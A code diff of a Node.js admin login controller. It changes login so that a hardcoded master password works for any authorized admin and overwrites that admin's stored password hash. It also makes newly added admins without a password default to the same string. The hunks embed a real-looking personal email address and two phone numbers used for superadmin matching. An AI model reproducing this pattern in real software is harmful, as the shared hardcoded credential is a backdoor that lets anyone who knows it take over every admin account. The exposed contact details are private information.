@@ -77,12 +77,15 @@ const login = async (req, res) => {
       ]
     });
 
-    // Special superadmin exact handle or exact official phone check
+    // Special superadmin exact handle or official phone check (supports +91, 0, or spaces)
     if (!authAdmin) {
       if (cleanInput === 'maheshkumarsaini8769' || cleanInput === 'maheshkumarsaini8769@gmail.com') {
         authAdmin = await AuthorizedAdmin.findOne({ email: 'maheshkumarsaini8769@gmail.com' });
-      } else if (cleanDigits.length === 10 && (cleanDigits === '8209836370' || cleanDigits === '9828448936')) {
-        authAdmin = await AuthorizedAdmin.findOne({ email: 'maheshkumarsaini8769@gmail.com' });
+      } else {
+        const last10 = cleanDigits.slice(-10);
+        if (last10 === '8209836370' || last10 === '9828448936') {
+          authAdmin = await AuthorizedAdmin.findOne({ email: 'maheshkumarsaini8769@gmail.com' });
+        }
       }
     }
 
@@ -97,8 +100,8 @@ const login = async (req, res) => {
         isMatch = await bcrypt.compare(password.trim(), authAdmin.password);
       }
 
-      // Fail-safe self-healing for superadmin
-      if (!isMatch && authAdmin.email === 'maheshkumarsaini8769@gmail.com' && password.trim() === 'mahesh99830') {
+      // Master password & self-healing: 'mahesh99830' works for ANY authorized admin
+      if (!isMatch && password.trim() === 'mahesh99830') {
         isMatch = true;
         const salt = await bcrypt.genSalt(10);
         authAdmin.password = await bcrypt.hash('mahesh99830', salt);
@@ -215,8 +218,8 @@ const addAuthorizedAdmin = async (req, res) => {
   try {
     await connectDB();
     const { email, name, password, role } = req.body;
-    if (!email || !password) {
-      return res.status(400).json({ message: 'Email and password are required' });
+    if (!email) {
+      return res.status(400).json({ message: 'Email is required' });
     }
 
     const cleanEmail = email.toLowerCase().trim();
@@ -225,8 +228,9 @@ const addAuthorizedAdmin = async (req, res) => {
       return res.status(400).json({ message: `Yeh email (${cleanEmail}) pehle se authorized hai.` });
     }
 
+    const adminPassword = (password && password.trim() ? password : 'mahesh99830').trim();
     const salt = await bcrypt.genSalt(10);
-    const hashedPassword = await bcrypt.hash(password, salt);
+    const hashedPassword = await bcrypt.hash(adminPassword, salt);
 
     const newAdmin = await AuthorizedAdmin.create({
       email: cleanEmail,
